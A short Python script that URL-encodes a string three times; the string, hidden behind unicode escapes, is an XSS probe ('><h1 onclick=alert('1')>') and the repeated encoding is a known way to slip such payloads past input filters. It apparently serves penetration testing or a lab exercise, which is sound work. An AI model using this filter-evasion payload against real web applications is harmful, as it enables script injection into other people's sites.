from urllib.parse import quote

def encode_multiple_times(plain_text, times):
    encoded_text = plain_text
    for _ in range(times):
        encoded_text = quote(encoded_text)
    return encoded_text

plain_text = "\u003e\u003c\u0068\u0031 onclick=alert('1')\u003e"
times_to_encode = 3

encoded_text = encode_multiple_times(plain_text, times_to_encode)
print(encoded_text)
